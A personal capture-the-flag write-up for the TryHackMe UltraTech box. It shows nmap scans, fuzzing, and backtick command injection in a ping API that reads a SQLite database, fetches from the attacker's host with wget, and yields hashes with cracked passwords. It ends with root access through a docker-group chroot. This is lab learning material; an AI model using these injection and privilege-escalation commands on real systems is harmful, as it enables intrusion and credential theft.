target: 10.10.14.178

┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# nmap 10.10.14.178                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 19:56 EDT
Nmap scan report for 10.10.14.178
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
8081/tcp open  blackice-icecap

website on : http://10.10.14.178:8081/
scan 2nd time
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# nmap -sC -sV -p21,22,8081 10.10.14.178
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 19:57 EDT
Nmap scan report for 10.10.14.178
Host is up (0.64s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc668985e705c2a5da7f01203a13fc27 (RSA)
|   256 c367dd26fa0c5692f35ba0b38d6d20ab (ECDSA)
|_  256 119b5ad6ff2fe449d2b517360e2f1d2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

found nothing i think i need a third scan
This nmap is useful:
└─# nmap -Pn -p- -A --min-rate 5000 10.10.14.178
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc668985e705c2a5da7f01203a13fc27 (RSA)
|   256 c367dd26fa0c5692f35ba0b38d6d20ab (ECDSA)
|_  256 119b5ad6ff2fe449d2b517360e2f1d2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Now i found another port
2. Directory fuzzing :
 :: Method           : GET
 :: URL              : http://10.10.14.178:8081/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 20, Words: 3, Lines: 1]
auth                    [Status: 200, Size: 39, Words: 8, Lines: 1]

found a robots.txt on 31331 and then found this 
10.10.14.178:31331/utech_sitemap.txt
/
/index.html
/what.html
/partners.html

I found a login page on the http://10.10.14.178:31331/partners.html
on source code : js/api.js
and this is interessting (function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
    
})();

I analyzed the code and i do this on the port 8081 : http://10.10.14.178:8081/ping?ip=127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms 

To bypass the command injection I do:
GET /ping?ip=`ls` HTTP/1. and here : ping: utech.db.sqlite: Name or service not known

Trying to get reverse shell through revshells but nothing works. I think i should embede my shell intot a .sh file
when i do this on the browser it's works http://10.10.14.178:8081/ping?ip=`wget%20http://10.8.128.36` without spaces
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/tryhackme]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.178 - - [09/Sep/2023 20:40:43] "GET / HTTP/1.1" 200 -

I don't get my shell. i will try to read the file utech.db.sqlite
I found http://10.10.14.178:8081/ping?ip=`cat%20utech.db.sqlite`
: ping: r00t:f357a0c52799563c7c7b76c1e7543a32       = f357a0c52799563c7c7b76c1e7543a32:n100906
admin:0d0ea5111e3c1def594c1684e3b9be84              = 0d0ea5111e3c1def594c1684e3b9be84:mrsheafy
and cracked 
Now the first thing to do is to access ssh's using these creds
admin access not works but r00t work


PrivESC through docker
i tried find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null and i found nothing 
using docker
find / -name docker.sock 2>/dev/null
then if i found .sock
docker images
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

r00t@ultratech-prod:/tmp/privs$ groups
r00t docker

i say only groups if i have docker i will check gtfo


r00t@ultratech-prod:/tmp/privs$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# 
